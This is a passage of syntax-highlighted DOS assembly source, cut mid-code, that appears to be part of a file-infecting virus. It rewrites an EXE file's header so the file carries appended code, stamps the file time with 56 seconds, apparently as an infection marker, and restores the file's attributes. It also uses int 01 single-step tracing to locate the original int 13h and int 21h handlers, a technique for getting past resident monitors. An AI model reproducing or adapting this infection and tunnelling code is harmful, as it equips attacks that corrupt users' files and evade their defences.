             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Hdrsize</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ReloCS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ReloSS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ExeSP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc1">;---- Count PageCnt -----------------</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">desh_size</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">sizeV</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;new file size</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc1">;-- PageCnt:=(filesie div 512 )+1</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0"> </span><span class="sc1">;div 512</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;+1</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">PageCnt</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc1">;---- Count partPag ----</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shrdd</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">shldd</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">partPag</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc1">;NEW Heder COMPLET</span><span class="sc0">
</span><span class="sc1">;----- Write new hade_exe --------</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc5">hendler</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">  </span><span class="sc1">;seek to 0:0</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">hendler</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">hade_exe</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">   </span><span class="sc1">; запись new heder</span><span class="sc0">
        </span><span class="sc1">; make 56 sec</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hendler</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">iNT</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111111111100000b</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">It_is_56sec2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hendler</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fileATR</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc1">;close file , set old atr</span><span class="sc0">
</span><span class="sc5">ErrorAcc</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">olld0x24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">olld0x24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------</span><span class="sc0">
</span><span class="sc5">detectint21and13h</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">52H</span><span class="sc0">         </span><span class="sc1">;Получает List of List</span><span class="sc0">
                   </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">21H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                   </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; cX:=baseMCB</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                  </span><span class="sc1">;---- Save int 01 in addres01hTR ------</span><span class="sc0">
                   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
                   </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">baseMCBCS</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; 0:[baseMCBCS] :=CX</span><span class="sc0">
                   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">04H</span><span class="sc0">
                   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
                   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
                   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">addres01hTR</span><span class="sc0">
                   </span><span class="sc6">REP</span><span class="sc0">   </span><span class="sc6">MOVSW</span><span class="sc0">
                   </span><span class="sc1">;----- Set new int 01 ----</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_01h</span><span class="sc0">
                   </span><span class="sc6">cli</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">sti</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                  </span><span class="sc1">;- Tras 13 -----------</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ProcSetTF_1</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
                   </span><span class="sc6">PUSHF</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">04CH</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ProcSetTF_0</span><span class="sc0">
                  </span><span class="sc1">;---------------------</span><span class="sc0">
                  </span><span class="sc1">; ret push ax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">new_01h</span><span class="sc4">],</span><span class="sc2">50h</span><span class="sc0">
                  </span><span class="sc1">;- Tras 21 -----------</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ProcSetTF_1</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
                   </span><span class="sc6">PUSHF</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">084H</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ProcSetTF_0</span><span class="sc0">
                   </span><span class="sc1">;----- Ret old int 01 ----</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                   </span><span class="sc6">cli</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres01hTR</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres01hTR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">sti</span><span class="sc0">
                   </span><span class="sc5">sub1</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">next_comm_01</span><span class="sc4">-</span><span class="sc5">new_01h</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">new_01h</span><span class="sc4">],</span><span class="sc2">50h</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">MAKeGOOD</span><span class="sc4">],</span><span class="sc2">8926h</span><span class="sc0">
                   </span><span class="sc1">;------------</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">addres21hCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Errrr</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">baseMCBCS</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">addres21hCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">No_Error</span><span class="sc0">
</span><span class="sc5">Errrr</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4ch</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">addres13hCS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">addres13hCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">addres21hCS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">addres21hCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6666h</span><span class="sc0">
</span><span class="sc5">No_Error</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
                   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">AccDen</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">baseMCBCS</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">202h</span><span class="sc0">
</span><span class="sc5">addres13hCS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">baseMCBCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">addres21hCS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">addres13hCS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">new_01h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">next_comm_01</span><span class="sc0">
</span><span class="sc5">next_comm_01</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">MAKeGOOD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres13hCS</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres13hCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc0">  </span><span class="sc1">;shr bx,4</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">Exit_int01</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
          </span><span class="sc6">JA</span><span class="sc0">    </span><span class="sc5">Exit_int01</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
